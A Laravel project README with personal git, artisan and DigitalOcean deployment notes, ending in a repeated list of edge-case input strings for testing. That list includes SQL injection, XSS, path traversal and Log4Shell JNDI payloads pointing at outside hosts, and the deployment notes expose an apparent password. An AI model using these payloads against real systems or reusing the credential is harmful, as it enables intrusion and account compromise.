<p align="center"><a href="https://laravel.com" target="_blank"><img src="https://raw.githubusercontent.com/laravel/art/master/logo-lockup/5%20SVG/2%20CMYK/1%20Full%20Color/laravel-logolockup-cmyk-red.svg" width="400" alt="Laravel Logo"></a></p>

<p align="center">
<a href="https://github.com/laravel/framework/actions"><img src="https://github.com/laravel/framework/workflows/tests/badge.svg" alt="Build Status"></a>
<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/dt/laravel/framework" alt="Total Downloads"></a>
<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/v/laravel/framework" alt="Latest Stable Version"></a>
<a href="https://packagist.org/packages/laravel/framework"><img src="https://img.shields.io/packagist/l/laravel/framework" alt="License"></a>
</p>

## About Laravel77

Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable and creative experience to be truly fulfilling. Laravel takes the pain out of development by easing common tasks used in many web projects, such as:

- [Simple, fast routing engine](https://laravel.com/docs/routing).
- [Powerful dependency injection container](https://laravel.com/docs/container).
- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
- [Robust background job processing](https://laravel.com/docs/queues).
- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).

Laravel is accessible, powerful, and provides tools required for large, robust applications.

## Learning Laravel

Laravel has the most extensive and thorough [documentation](https://laravel.com/docs) and video tutorial library of all modern web application frameworks, making it a breeze to get started with the framework.

You may also try the [Laravel Bootcamp](https://bootcamp.laravel.com), where you will be guided through building a modern Laravel application from scratch.

If you don't feel like reading, [Laracasts](https://laracasts.com) can help. Laracasts contains thousands of video tutorials on a range of topics including Laravel, modern PHP, unit testing, and JavaScript. Boost your skills by digging into our comprehensive video library.

## Laravel Sponsors

We would like to extend our thanks to the following sponsors for funding Laravel development. If you are interested in becoming a sponsor, please visit the [Laravel Partners program](https://partners.laravel.com).

### Premium Partners

- **[Vehikl](https://vehikl.com)**
- **[Tighten Co.](https://tighten.co)**
- **[Kirschbaum Development Group](https://kirschbaumdevelopment.com)**
- **[64 Robots](https://64robots.com)**
- **[Curotec](https://www.curotec.com/services/technologies/laravel)**
- **[DevSquad](https://devsquad.com/hire-laravel-developers)**
- **[Redberry](https://redberry.international/laravel-development)**
- **[Active Logic](https://activelogic.com)**

## Contributing

Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](https://laravel.com/docs/contributions).

## Code of Conduct

In order to ensure that the Laravel community is welcoming to all, please review and abide by the [Code of Conduct](https://laravel.com/docs/contributions#code-of-conduct).

## Security Vulnerabilities

If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell via [taylor@laravel.com](mailto:taylor@laravel.com). All security vulnerabilities will be promptly addressed.

## License

The Laravel framework is open-sourced software licensed under the [MIT license](https://opensource.org/licenses/MIT).


## Quick Git
```bash
git fetch --all
git fetch --prune
git branch -r
git branch -a
git checkout main 
git pull origin main
git pull --rebase origin main
# Reset all changes and switch to updated main or branch
git reset --hard origin/main
git reset --hard origin/<nombre-de-rama>
# Get remote branch to local
git checkout -b fix/calendar-logic origin/fix/calendar-logic
git checkout -b feature/landing-page  origin/feature/landing-page
# Create a new local branch
git checkout -b NewBranch
# Delete locan branch
git branch -d SomeBranch
# Delete remote branch
git push origin --delete RemoteBranch
# Push changes to remote branch
git push -u origin BranchName

# Mirror Repo
git remote add mirror https://github.com/imalexrd/TLP.git
git push mirror feature/themes-login-colors
git push mirror main
git pull mirror main
Crear rama en repo locad basada en repo remoto
git checkout -b tlp-dev mirror/dev
```

## Laravel Comands

```bash
# Laravel init
composer install
npm install
cp .env.example .env
php artisan key:generate

# To start reverb realtime setup server
php artisan serve
php artisan reverb:start
php artisan queue:listen
php artisan queue:work


# Database helper commands
php artisan migrate
php artisan migrate:rollback
php artisan migrate:reset
php artisan migrate:refresh
php artisan migrate:refresh --seed
php artisan db:seed
php artisan db:seed --class=InitSeeder     


git reset --hard 1949e0cb2145e8727ab051cd57f891368a1c2078

# Cache clearing comands
php artisan route:clear  
php artisan config:clear  
php artisan cache:clear  
php artisan view:clear


# Serving 2 proyects on diferent ports
php artisan serve --port=8000
php artisan serve --port=8001
php artisan serve --host=0.0.0.0 --port=8080


```
## Some current proyects and branches

```bash
git clone https://github.com/taxlabpro/TaxLabPro.git
git clone https://github.com/imalexrd/TLP.git
git clone https://github.com/imalexrd/larastart.git
```


## GIT Dictionary

```bash
# Configura tu nombre de usuario para todos tus repositorios locales
git config --global user.name "Tu Nombre"
# Configura tu email para todos tus repositorios locales
git config --global user.email "tu@email.com"
# Inicia un repositorio nuevo en la carpeta actual
git init
# Clona (descarga) un repositorio existente desde una URL
git clone [url_del_repositorio]
# 1. Muestra el estado de los archivos (modificados, nuevos, etc.)
git status
# 2. Añade un archivo específico al área de "staging" (preparación)
git add [nombre_del_archivo]
# 2a. O añade TODOS los archivos modificados y nuevos al staging
git add .
# 3. Guarda los cambios del staging en el historial con un mensaje descriptivo
git commit -m "Mensaje claro y conciso del commit"
# 4. Sube tus commits al repositorio remoto (ej. GitHub, GitLab)
git push
# 5. Trae los cambios del repositorio remoto y los fusiona con tu rama local
git pull
# Lista todas las ramas locales. La actual se marca con *
git branch
# Crea una nueva rama
git branch [nombre-rama]
# Cambia a la rama especificada
git switch [nombre-rama]
# (La forma antigua y aún muy usada es: git checkout [nombre-rama])
# Crea una nueva rama y cambia a ella en un solo paso
git switch -c [nombre-rama]
# (La forma antigua: git checkout -b [nombre-rama])
# Fusiona los cambios de [nombre-rama] en tu rama actual
git merge [nombre-rama]
# Elimina una rama local (solo si sus cambios ya fueron fusionados)
git branch -d [nombre-rama]
# Muestra el historial de commits de la rama actual
git log
# Muestra el historial de forma compacta (una línea por commit)
git log --oneline
# Muestra el historial como un grafo, útil para ver ramas y fusiones
git log --graph --oneline --decorate
# Descarta los cambios en un archivo (vuelve a como estaba en el último commit)
git restore [archivo]
# (Forma antigua: git checkout -- [archivo])
# Saca un archivo del área de staging, pero mantiene los cambios en tu directorio
git restore --staged [archivo]
# (Forma antigua: git reset HEAD [archivo])
# Modifica el último commit (cambiar mensaje o añadir archivos que olvidaste)
git commit --amend
# Crea un nuevo commit que revierte los cambios de un commit anterior.
# Es la forma SEGURA de deshacer cambios en ramas públicas.
git revert [hash-del-commit]
# ¡CUIDADO! Resetea tu historial y archivos al estado de un commit específico.
# Borra todo el trabajo posterior a ese commit. No usar en ramas compartidas.
git reset --hard [hash-del-commit]
# Lista los repositorios remotos configurados (normalmente llamado "origin")
git remote -v
# Añade un nuevo repositorio remoto
git remote add [nombre_remoto] [url_del_repositorio]
# Descarga los cambios del remoto, pero NO los fusiona con tu rama.
# Útil para ver qué hay de nuevo sin alterar tu trabajo.
git fetch [nombre_remoto]
# Sube una rama específica a un remoto específico
git push [nombre_remoto] [nombre-rama]
git checkout -b branch-name origin/branch-name
# Inicia un rebase interactivo de los últimos 3 commits
git rebase -i HEAD~3
# Guarda los cambios actuales en un "stash" (escondite)
git stash
# Muestra la lista de stashes guardados
git stash list
# Aplica el último stash guardado Y lo elimina de la lista
git stash pop
# Aplica el último stash, pero lo mantiene en la lista
git stash apply
# Elimina el último stash de la lista
git stash drop
# Toma el commit con el hash indicado y lo aplica en tu rama actual
git cherry-pick [hash-del-commit]
# Muestra el registro de todas las acciones
git reflog
# Crea una etiqueta "ligera" en el commit actual
git tag v1.0.0
# Crea una etiqueta "anotada" (recomendado), que incluye autor, fecha y mensaje
git tag -a v1.0.1 -m "Versión 1.0.1 - Corrección de bugs menores"
# Lista todas las etiquetas
git tag
# Sube todas tus etiquetas locales al repositorio remoto
git push --tags
# Inicia el proceso de búsqueda
git bisect start
# Marca el commit actual como "malo" (donde el bug existe)
git bisect bad
# Marca un commit antiguo donde sabes que el bug NO existía
git bisect good [hash-del-commit-bueno]


```



# Digital Ocean TLP Configuration

```bash
adduser deployuser
#taxlabPRO2525
usermod -aG sudo deployuser
su - deployuser
ssh-keygen -t ed25519 -C "imalexrd@gmail.com" 
sudo git clone git@github.com:taxlabpro/TaxLabPro.git

sudo mv html html_old
sudo mv TaxLabPro html
sudo chown -R deployuser:www-data /var/www/html
sudo chmod -R 755 /var/www/html
sudo chown -R deployuser:www-data storage bootstrap/cache public/uploads
sudo chmod -R 775 /var/www/html/storage /var/www/html/bootstrap/cache


su - deployuser
cd /var/www/html
git reset --hard HEAD
git pull origin main
composer install --no-dev --optimize-autoloader 
php artisan migrate --force 
php artisan cache:clear
php artisan config:cache
php artisan view:cache

sudo chown -R deployuser:www-data uploads
php artisan migrate:fresh --seed


```

Lorem Ipsum 12345 !@#$%^&*()_+=-`~[]{}\|;:'",./<>?
你好世界 €£¥©®™ ±≠≤≥÷×√ ∑∫∞ π ∆ Ω μ ø
Привет Ελληνικά עברית العربية 👍😂🚀🔥
áéíóúüñç ÁÉÍÓÚÜÑÇ äöü ÄÖÜ ß
\t\n\r\f\v\u00A0\u2003\u2028\u2029
\0 (null char)

Z͑ͫ̓ͣͨͬ͏̸uń̋ͪ̊̋ͫ̃g͂ͯͪ̄ͫͬ͒o͂̌̓ͬͫ́ T͐̆ͪ̋ͫe͑ͫ̓ͣͨͬ͏̸x͂̌̓ͬͫ́ͭt̚◢
̡͓͖̹̃͛͑͊̾Ú̧͖̤̺̭̝̪̄͒̃͟n̛̰̝̜̓͞i̤͎̬͒̂͑̆́ç͓̞̖̥͚̇ó̥̤̺̝̪̰̟dę́ ̯͓̰̠́̏̃͑͘Ę͙̥̱͚͍́̾̎͟n͞t͓͖́͘h̡͓͖̹̃͛͑͊̾ú̧͖̤̺̭̝̪̄͒̃͟s̨͙̪͘í̥̤̺̝̪̰̟ast
﷽
(╯°□°)╯︵ ┻━┻
1.000.000,00 vs 1,000,000.00
జ్ఞ‌ా (zero-width non-joiner)
a‍b (zero-width joiner)
a​b (zero-width space)
İı (Turkish I) vs Ii
Lookalikes: l1O0 |(pipe)I(capital i)l(lowercase L) O(capital o)0(zero)
' OR '1'='1' --
; DROP TABLE usersX; --
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
../../../../etc/passwd
{{ sensitive_data }}
${jndi:ldap://x.sixela.me}
\ / : * ? " < > |
CON, PRN, AUX, NUL, COM1, LPT1
Lorem Ipsum 12345 !@#$%^&*()_+=-`~[]{}\|;:'",./<>?
你好世界 €£¥©®™ ±≠≤≥÷×√ ∑∫∞ π ∆ Ω μ ø
Привет Ελληνικά עברית العربية 👍😂🚀🔥
áéíóúüñç ÁÉÍÓÚÜÑÇ äöü ÄÖÜ ß
\t\n\r\f\v\u00A0\u2003\u2028\u2029
\0 (null char)

Z͑ͫ̓ͣͨͬ͏̸uń̋ͪ̊̋ͫ̃g͂ͯͪ̄ͫͬ͒o͂̌̓ͬͫ́ T͐̆ͪ̋ͫe͑ͫ̓ͣͨͬ͏̸x͂̌̓ͬͫ́ͭt̚◢
̡͓͖̹̃͛͑͊̾Ú̧͖̤̺̭̝̪̄͒̃͟n̛̰̝̜̓͞i̤͎̬͒̂͑̆́ç͓̞̖̥͚̇ó̥̤̺̝̪̰̟dę́ ̯͓̰̠́̏̃͑͘Ę͙̥̱͚͍́̾̎͟n͞t͓͖́͘h̡͓͖̹̃͛͑͊̾ú̧͖̤̺̭̝̪̄͒̃͟s̨͙̪͘í̥̤̺̝̪̰̟ast
﷽
(╯°□°)╯︵ ┻━┻
1.000.000,00 vs 1,000,000.00
జ్ఞ‌ా (zero-width non-joiner)
a‍b (zero-width joiner)
a​b (zero-width space)
İı (Turkish I) vs Ii
Lookalikes: l1O0 |(pipe)I(capital i)l(lowercase L) O(capital o)0(zero)
' OR '1'='1' --
; DROP TABLE users; --
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
../../../../etc/passwd
{{ sensitive_data }}
${jndi:ldap://evil.com/a}
\ / : * ? " < > |
CON
PRN
AUX
NUL
COM1
LPT1
AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDEEEEEEEEEEFFFFFFFFFFGGGGGGGGGGHHHHHHHHHHIIIIIIIIIIJJJJJJJJJJKKKKKKKKKKLLLLLLLLLLMMMMMMMMMMNNNNNNNNNNOOOOOOOOOOPPPPPPPPPPQQQQQQQQQQRRRRRRRRRRSSSSSSSSSSTTTTTTTTTTUUUUUUUUUUVVVVVVVVVVWWWWWWWWWWXXXXXXXXXXYYYYYYYYYYZZZZZZZZZZZaaaaaaaaaabbbbbbbbbbccccccccccdddddddddddeeeeeeeeeeffffffffffgggggggggghhhhhhhhhhiiiiiiiiiiijjjjjjjjjjkkkkkkkkkkllllllllllmmmmmmmmmmnnnnnnnnnnooooooooooppppppppppqqqqqqqqqqrrrrrrrrrrssssssssssttttttttttuuuuuuuuuuvvvvvvvvvvwwwwwwwwwwxxxxxxxxxxyyyyyyyyyyzzzzzzzzzzz